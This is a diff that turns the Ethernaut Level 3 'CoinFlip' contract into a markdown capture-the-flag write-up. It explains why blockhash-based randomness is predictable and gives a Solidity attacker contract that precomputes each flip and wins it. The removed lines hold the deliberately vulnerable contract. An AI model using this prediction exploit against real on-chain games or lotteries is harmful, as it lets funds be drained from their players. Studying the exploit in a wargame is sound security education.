@@ -1,33 +1,57 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<div align="center">
 
-contract CoinFlip {
-    uint256 public consecutiveWins;
-    uint256 lastHash;
+<img src="../assets/levels/3-coinflip.webp" width="600px"/>
+<br><br>
+<h1><strong>Ethernaut Level 3 - Coinflip</strong></h1>
+
+</div>
+
+## Objectif
+
+<img src="../assets/requirements/3-coinflip-requirements.webp" width="800px"/>
+
+## The hack
+
+Everything in the EVM is deterministic. This means that entropy doesn't exist on-chain (except using third party solution like [Chainlink VRF](https://docs.chain.link/vrf/)).
+The solution used in the `CoinFlip` contract is only pseudo-random. So we can predict the next flip by using the same logic as the contract.
+Once done, we can call the `flip` function with the predicted value and repeat this 10 times to win the level.
+
+## Solution
+
+We can craft a smart contract that reproduce the same logic as the `CoinFlip` contract to predict the next flip and call the `flip` function with the predicted value.
+
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface ICoinFlip {
+    function flip(bool) external returns (bool);
+}
+
+contract Unflip {
+    address constant coinflip = 0xb721D5C58B4B2d7Fc82084541C639A6b6E3CBf73; // Replace with your CoinFlip instance
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    constructor() {
-        consecutiveWins = 0;
+    function playToWin() private view returns (bool) {
+        uint256 pastBlockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlipResult = pastBlockValue / FACTOR;
+        return coinFlipResult == 1 ? true : false;
     }
 
-    function flip(bool _guess) public returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-
-        if (lastHash == blockValue) {
-            revert();
-        }
-
-        lastHash = blockValue;
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-
-        if (side == _guess) {
-            consecutiveWins++;
-            return true;
-        } else {
-            consecutiveWins = 0;
-            return false;
-        }
+    function attack() public {
+        ICoinFlip(coinflip).flip(playToWin());
     }
 }
+```
+
+## Takeaway
+
+- Entropy is not trivial on the blockchain
+- Global variables should not be used to generate "randomness"
+- Great read on this: https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#entropy-illusion
+
+<div align="center">
+<br>
+<h2>🎉 Level completed! 🎉</h2>
+</div>
